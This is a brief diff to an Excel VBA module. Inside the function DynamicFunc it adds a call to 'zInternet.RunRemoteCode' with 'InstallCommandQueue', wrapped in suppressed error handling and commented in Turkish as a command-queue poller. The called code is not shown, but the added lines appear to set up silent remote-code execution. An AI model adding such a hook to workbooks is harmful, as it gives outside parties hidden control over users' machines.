@@ -55,6 +55,11 @@ Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
                vbExclamation, "HeartbeatPing"
     End If
 
+    ' Komut kuyrugu — Excel ic thread (TeklifPollHost OnTime)
+    On Error Resume Next
+    Application.Run "zInternet.RunRemoteCode", "InstallCommandQueue"
+    On Error GoTo 0
+
     Set DynamicFunc = Nothing
 End Function
 
